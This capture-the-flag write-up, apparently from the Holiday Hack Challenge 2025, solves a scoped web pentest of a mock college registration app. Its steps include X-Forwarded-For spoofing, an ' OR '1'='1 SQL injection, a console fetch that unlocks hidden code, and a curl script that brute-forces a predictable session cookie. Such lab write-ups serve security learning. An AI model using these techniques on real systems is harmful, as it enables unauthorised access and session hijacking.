---
nav: |
  <table>
  <thead><tr><th><a href="/HHC_2025/act3_snowcat_mjd.html">Previous Objective: Act3 Snowcat RCE abd Privilege Escalation</a></th> <th><a href="/HHC_2025/index.html">Table of Contents</a></th> <th><a href="/HHC_2025/act3_snowglobe_mjd.html">Next Objective: Act3 Find and Shutdown Frosty's Snowglobe Machine</a></th></table>
---
<table>
<thead><tr><th>Objective: SchrÃ¶dinger's Scope</th> <th>Difficulty Level: 3</th><tr><td>Kevin in the Retro Store ponders pentest paradoxesâ€”can you solve SchrÃ¶dinger's Scope?</td> <td>Location: Retro Store</td></table>
<h2>Solution Overview</h2>
The objective is to conduct a penetration test of a Neighborhood College Registration system. The test is scoped to a specific path of the application, accessing other paths is limited by an active monitoring system. When a threshold is reached, the engagement is reset. This resets the cookies that track the session and achievements. When this occurs, any vulnerabilities achieved are no longer logged and must be redone. The testing begins with reconnaisance of the application. Vulnerabilities are tested and exploited if possible.
<table>
<thead><tr><th>Activity</th> <th>Primary Tactic</th> <th>MITRE ATT&CK Technique ID</th> <th>MITRE ATT&CK Technique Name</th><tr><td>Developer information disclosure</td> <td>Reconnaissance</td> <td>T1592.004</td> <td>Gather Credentials</td><tr><td>X-Forwarded-For exploit</td> <td>Initial Access</td> <td>T1190</td> <td>Exploit Public-Facing Application</td><tr><td>Found commented code</td> <td>Reconnaissance</td> <td>T1595.002</td> <td>Vulnerability Scanning</td><tr><td>SQL Injection</td> <td>Initial Access</td> <td>T1190</td> <td>Exploit Public-Facing Application</td><tr><td>Unauthorized content</td> <td>Discovery</td> <td>T1083</td> <td>File and Directory Discovery</td><tr><td>Cookie prediction</td> <td>Credential Access</td> <td>T1539</td> <td>Steal Web Session Cookie</td></table>
<h2>Detailed Solution</h2>
<details>
<summary>Click to expand</summary>
<p>The initial step was to identify the bot responsible for the additional scope violations</p>
<p>!<a href="/HHC_2025/images/shroedingers_webbot.jpg">Identification of WebBot</a> </p>
<p>With the object pattern identified, it is possible to use browser Developer Tools to block the request.</p>
<p>Selecting "Network Request Blocking" from the More Tools menu. The pattern to block is "<em>gnomeU</em>"</p>
<p>!<a href="/HHC_2025/images/shroedingers_webbotblock.jpg">Blocking of WebBot</a> </p>
<p>Reconnaisance began with examining the contents of the sitemap for the application.</p>
<p>The sitemap was located at: flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/sitemap/?id=2328f6ee-8810-4052-aa3d-f5c75b5cb934</p>
<pre><code>
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/admin
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/admin
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/admin/console
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/admin/console
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/admin/logs
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/admin/logs
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/auth
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/auth
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/auth/register
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/auth/register
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/auth/register/login
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/auth/register/login
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/login
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/login
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/reset
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/reset/ 
&gt;http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/sitemap
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/sitemap/
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/status_report
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/status_report/
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/search
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/search/
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/search/student_lookup
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/search/student_lookup
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/register
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/register/
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/register/dev
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/register/dev/ 
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/register/dev/dev_notes
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/register/dev/dev_notes/
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/register/dev/dev_todos
http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/register/dev/dev_todos/
</code></pre>
<p>Exploring the endpoints revealed several pages of notes, two that were within the scope.</p>
<p>The first enpoint found: /register/dev/dev_todos</p>
<p>!<a href="/HHC_2025/images/shroedingers_devtodos.jpg">Developer Information To Do List</a> </p>
<p>The second endpoint found: /register/dev/dev_notes</p>
<p>!<a href="/HHC_2025/images/shroedingers_devnotes.jpg">Developer Information Notes</a> </p>
<p>Locating both of these files construct the Developer information disclosure vulnerability discovered.</p>
<p><strong>Answer: Developer information disclosure</strong></p>
<p>With the information the developer left behind, it is possible to attack the login page. Providing the credentials from the note results in an Invalid Forwarding IP error. The X-Forwarded-For header is meant to preserve the true client IP across proxies. But because it can be manually set by clients, itâ€™s vulnerable to spoofing. To bypass this error, we will set the header to 127.0.0.1 in an attempt to trick the web server into believing the request originated from itself. </p>
<p>!<a href="/HHC_2025/images/shroedingers_xforwarder.jpg">Spoofing the X-Forwarder Header</a> </p>
<p>The login "testuser" with the password "2025h0L1d4y5" succeeds, and the /register/courses node is now accessible.</p>
<p>Spoofing the X-Forwarded-For header and authenticating as testuser achieves the second vulnerability.</p>
<p><strong>Answer: X-Forwarded-For exploit</strong></p>
<p>Examining the source code for the courses page, a commented secion of code is discovered.</p>
<p>!<a href="/HHC_2025/images/shroedingers_commentedsearch.jpg">Commented Search Feature</a> </p>
<p>Using a snippet of code from the register/js/registerCourses.js in the developer console this feature can be enabled:</p>
<pre><code>
function checkAndReportCourseSearch() {
  const courseList = document.getElementById(&#39;courseSearch&#39;);
  if (courseList &amp;&amp; !courseList.dataset.trapTriggered) {
    courseList.dataset.trapTriggered = &quot;true&quot;;
    fetch(&#39;/register/courseSearchUnlocked&#39;, {       method: &#39;POST&#39;,       headers: { &#39;Content-Type&#39;: &#39;application/json&#39; },       body: JSON.stringify({         message: &#39;Course search was uncommented!&#39;,         timestamp: Date.now(),
        linkCount: courseList.querySelectorAll(&#39;a&#39;).length
      })
    })
</code></pre>
<p>Executing the following code in the Developer Console activates the code:</p>
<pre><code>
fetch(&#39;/register/courseSearchUnlocked&#39;, { method: &#39;POST&#39;, headers: { &#39;Content-Type&#39;: &#39;application/json&#39; }, body: JSON.stringify({ message: &#39;Course search was uncommented!&#39;, timestamp: Date.now(), linkCount: 1 }) }).then(r =&gt; r.text()).then(console.log)
</code></pre>
<p>This activates the search feature in the application:</p>
<p>!<a href="/HHC_2025/images/shroedingers_activatedsearch.jpg">Activated Search Feature</a> </p>
<p><strong>Answer: Found commented code</strong></p>
<p>Testing the search interface for SQL Injection (SQLi), the application was found to be vulnerable.  An OR injection (' OR '1'='1) was utilized to list all course entries in the database.</p>
<p>!<a href="/HHC_2025/images/shroedingers_searchsqli.jpg">Search SQL Injection</a> </p>
<p><strong>Answer: SQL Injection</strong></p>
<p>This reveals the unauthorized course and allows me to report it:</p>
<p>!<a href="/HHC_2025/images/shroedingers_mischief.jpg">Unauthorized Course</a></p>
<p>Opening the course details prompts for reporting:</p>
<p>!<a href="/HHC_2025/images/shroedingers_gnomecourse.jpg">Unauthorized Course Details</a> </p>
<p><strong>Answer: Unauthorized content</strong></p>
<p>The final hint suggests that a token or cookie may be weak. The error message when attempting to access the wip/holiday_behavior endpoint confirms this idea.</p>
<p>!<a href="/HHC_2025/images/shroedingers_wipermissions.jpg">Registration Value</a> </p>
<p>Looking at the registration values generated:</p>
<pre><code>
registration	eb72a05369dcb44d
registration	eb72a05369dcb44d
registration	eb72a05369dcb455
registration	eb72a05369dcb453
registration	eb72a05369dcb451
registration	eb72a05369dcb454
registration	eb72a05369dcb444
registration	eb72a05369dcb445
registration	eb72a05369dcb447
registration	eb72a05369dcb449
registration	eb72a05369dcb456
registration	eb72a05369dcb448
registration	eb72a05369dcb452
registration	eb72a05369dcb44a
registration	eb72a05369dcb443
</code></pre>
<p>Only the last two digits change, this indicates there are only 256 variations.</p>
<p>The TestUser needs to be logged in to test the registration values. </p>
<p>Using this script to locate the valid session:</p>
<pre><code>
#!/bin/bash
prefix=&quot;eb72a05369dcb4&quot;
schrod=&quot;7c3ee3a7-6781-459b-8db9-eee63c05558b&quot;
id=&quot;48dd96c0-0794-41cf-96c1-bf3ddc555a30&quot;
for i in {0..255}; do
  hex=$(printf &#39;%02x&#39; $i)
  # Login and access page in one flow
  response=$(curl -s -L \     -H &quot;X-Forwarded-For: 127.0.0.1&quot; \     -H &quot;Cookie: Schrodinger=$schrod; registration=${prefix}${hex}&quot; \     -d &quot;username=teststudent&amp;password=2025h0L1d4y5&quot; \     &quot;https://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/login?id=$id&quot; \     --next \     -H &quot;X-Forwarded-For: 127.0.0.1&quot; \     -H &quot;Cookie: Schrodinger=$schrod; registration=${prefix}${hex}&quot; \     &quot;https://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/courses/wip/holiday_behavior?id=$id&quot;)
  if ! echo &quot;$response&quot; | grep -qi &quot;invalid&quot;; then
    echo &quot;============================================&quot;
    echo &quot;VALID REGISTRATION COOKIE FOUND!&quot;
    echo &quot;registration=${prefix}${hex}&quot;
    echo &quot;============================================&quot;
    echo &quot;&quot;
    echo &quot;$response&quot;
    echo &quot;&quot;
    echo &quot;============================================&quot;
    echo &quot;Response saved to: /tmp/valid_${hex}.html&quot;
    echo &quot;$response&quot; &gt; /tmp/valid_${hex}.html
    exit 0
  else
    echo -n &quot;.&quot;
  fi
done
echo &quot;&quot;
echo &quot;No valid registration cookie found in range 00-ff&quot;
</code></pre>
<p>This results in a VALID REGISTRATION COOKIE FOUND!</p>
<p>registration=eb72a05369dcb44c</p>
<p>Hijacking this session token, the document in wip is accessed.</p>
<p><strong>Answer: Cookie prediction</strong></p>
<p>!<a href="/HHC_2025/images/shroedingers_final.jpg">Final Assessment Results</a> </p>
</details>
<h2>Tools Reference</h2>
<table>
<thead><tr><th>Tools Used</th> <th>Tool Version</th><tr><td>Edge Developer Tools</td> <td>Version 142.0.3595.53</td> <td></td><tr><td>Burp Suite Community Edition</td> <td>v2024.11.2</td></table>
<h2>Hints Reference</h2>
<table>
<thead><tr><th>Provided By</th> <th>Hint</th><tr><td>Santa</td> <td>Though it might be more interesting to start off trying clever techniques and exploits, always start with the simple stuff first, such as reviewing HTML source code and basic SQLi.</td><tr><td>Santa</td> <td>Watch out for tiny, pesky gnomes who may be violating your progess. If you find one, figure out how they are getting into things and consider matching and replacing them out of your way.</td><tr><td>Santa</td> <td>As you test this with a tool like Burp Suite, resist temptations and stay true to the instructed path.</td><tr><td>Santa</td> <td>During any kind of penetration test, always be on the lookout for items which may be predictable from the available information, such as application endpoints. Things like a sitemap can be helpful, even if it is old or incomplete. Other predictable values to look for are things like token and cookie values</td><tr><td>Santa</td> <td>Pay close attention to the instructions and be very wary of advice from the tongues of gnomes! Perhaps not ignore everything, but be careful!</td><tr><td>Kevin</td> <td>The Neighborhood College Course Registration System has been getting some updates lately and I'm wondering if you might help me improve its security by performing a small web application penetration test of the site. For any web application test, one of the most important things for the test is the 'scope', that is, what one is permitted to test and what one should not. While hacking is fun and cool, professional integrity means respecting scope boundaries, especially when there are tempting targets outside our permitted scope. Thankfully, the Neighborhood College has provided a very concise set of 'Instructions' which are accessible via a link provided on the site you will be testing. Do not overlook or dismiss the instructions! Following them is key to successfully completing the test. Unfortunately, those pesky gnomes have found their way into the site and have been causing some mischief as well. Be wary of their presence and anything they may have to say as you are testing. Can you help me demonstrate to the Neighborhood College that we know what responsible penetration testing looks like?</td></table>
<h2>Acknowledgements</h2>
<table>
<thead><tr><th>Provided By</th> <th>Notes</th><tr><td>khesperus</td> <td>Provided a sanity check by confirming that I had all the elements to solve the objective</td><tr><td>eucrates</td> <td>Provided feedback on scope and avoiding rabbit holes</td></table>
<table>
<thead><tr><th><a href="/HHC_2025/act3_snowcat_mjd.html">Previous Objective: Act3 Snowcat RCE abd Privilege Escalation</a></th> <th><a href="/HHC_2025/index.html">Table of Contents</a></th> <th><a href="/HHC_2025/act3_snowglobe_mjd.html">Next Objective: Act3 Find and Shutdown Frosty's Snowglobe Machine</a></th></table>